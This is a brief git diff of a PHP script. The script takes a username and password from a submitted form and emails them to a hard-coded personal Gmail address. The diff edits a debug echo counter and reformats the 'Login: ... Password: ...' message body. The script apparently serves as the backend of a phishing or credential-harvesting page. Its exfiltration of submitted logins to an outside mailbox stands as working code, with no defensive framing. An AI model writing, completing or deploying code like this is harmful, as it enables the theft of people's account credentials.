@@ -1,5 +1,5 @@
 <?php
-echo "Прошло5";
+echo "Прошло6";
 ini_set('display_errors', '1');
 
 $username=$_POST['username'];
@@ -29,7 +29,7 @@ try {
     $mail->addAddress('Nikibestshark@gmail.com');     //Add a recipient
 
 
-    $message = "Login". $username. "/n"."Password". $password;
+    $message = "Login: ". $username." Password: ". $password;
 
     //Content
     $mail->isHTML(true);                                  //Set email format to HTML
